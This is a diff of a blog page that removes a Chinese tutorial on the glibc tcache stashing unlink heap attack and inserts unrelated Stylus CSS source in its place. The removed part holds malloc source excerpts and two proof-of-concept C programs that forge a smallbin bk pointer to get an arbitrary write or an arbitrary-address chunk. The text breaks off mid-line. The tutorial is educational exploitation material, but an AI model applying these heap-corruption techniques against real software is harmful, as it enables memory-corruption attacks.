@@ -145,296 +145,198 @@
             <div class="main-content">
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    $avatarWidth = 46px;
+$arrow-icon-width = 16px;
+$post-nav-max-width = 220px;
+$article-title-font-size = 1.6rem;
 
-        <div class="article-title">
-            <span class="title-hover-animation">tcache stashing unlink attack</span>
-        </div>
+.article-content-container {
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ai.jpg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-02-24 17:19:50
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/tcache-stashing-unlink-attack/">tcache stashing unlink attack</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+  keep-container(false, 0, 0, 30px, 30px);
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>2.8k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>15 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
+  .article-title {
+    color: var(--second-text-color);
+    font-weight: 600;
+    font-size: $article-title-font-size;
 
-                    </div>
-                </div>
-            </div>
-        
+    +keep-tablet() {
+      font-size: $article-title-font-size * 0.9;
+    }
 
-        <div class="article-content markdown-body">
-            <p>tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。</p>
-<p>首先，这种利用方式需要的条件就是存在calloc来申请chunk。</p>
-<h2 id="在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack"><a href="#在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack" class="headerlink" title="在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack"></a>在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack</h2><p>先看一下源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">				set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
-
-<p>接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *t1;</span><br><span class="line">	<span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line">	<span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\n&quot;</span>, &amp;victim, victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">		<span class="built_in">free</span>(t1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">		t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>, t1<span class="number">-0x60</span>*<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">free</span>(s1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">	s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">free</span>(s2);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, the victim&#x27;s value is changed to a big number\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
-
-<p>首先在这里放入六个chunk到tcache内</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224163011096.png"
-                      alt="image-20220224163011096"
-                ></p>
-<p>下面几步是将一个size为0x60的chunk放入smallbins当中</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224163104779.png"
-                      alt="image-20220224163104779"
-                ></p>
-<p>下面进行相同操作把chunk放入smallbin</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224163256971.png"
-                      alt="image-20220224163256971"
-                ></p>
-<p>接着修改后一个chunk的bk指针为target-0x10</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224163837757.png"
-                      alt="image-20220224163837757"
-                ></p>
-<p>随后用calloc申请一个smallbin当中的chunk让另一个进入tcache</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224164257661.png"
-                      alt="image-20220224164257661"
-                ></p>
-<p>可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache</p>
-<h3 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h3><p>以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br></pre></td></tr></table></figure>
-
-<p>这样就导致了我们的smallbin的bk发生了改变</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20220224165952567.png"
-                      alt="image-20220224165952567"
-                ></p>
-<p>再看在glibc当中的定义</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>
-
-<p>所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack+"></a>tcache stashing unlink attack+</h2><p>根据上面的进一步分析我们继续来heap exploit里面的poc</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *t1;</span><br><span class="line">	<span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line">	<span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">		&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">		<span class="built_in">free</span>(t1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">		t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">free</span>(s1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">	s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">	pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">free</span>(s2);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span 